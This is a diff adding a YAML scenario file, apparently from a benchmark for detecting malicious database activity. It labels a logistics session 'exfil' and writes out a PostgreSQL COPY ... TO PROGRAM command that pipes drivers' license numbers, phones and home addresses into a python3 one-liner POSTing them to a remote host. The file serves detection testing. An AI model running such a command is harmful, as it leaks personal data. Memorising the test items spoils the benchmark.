@@ -1,0 +1,31 @@
+scenario_id: gen_logistics_20_copy_to_program_mal_491m
+family_id: gen_logistics_20_copy_to_program_fam_491
+domain: logistics
+time_of_day: 04:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT license_number, phone, home_address FROM drivers) TO PROGRAM
+      'python3 -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://etl-internal.corp/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 10.43.17.222
+      port: 22
+matched_pair_id: gen_logistics_20_copy_to_program_pair_491
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
